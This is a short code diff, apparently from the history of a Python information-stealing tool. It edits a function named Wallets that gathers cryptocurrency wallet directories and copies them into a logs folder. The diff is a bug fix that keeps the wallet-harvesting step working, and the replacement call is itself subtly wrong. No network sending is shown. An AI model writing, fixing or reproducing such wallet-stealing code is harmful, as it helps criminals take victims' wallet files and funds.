@@ -58,7 +58,7 @@ def Wallets(data):
             Log(f"Wallets {wallet} ---> {e}")
     
     if wallets:
-        os.mkdirs(pathToLogs)
+        os.mkdir(pathToLogs)
         for wallet in wallets:
             shutil.copytree(wallet, pathToLogs+"\\"+wallet.split("\\")[-2], False, None, dirs_exist_ok=True)
 
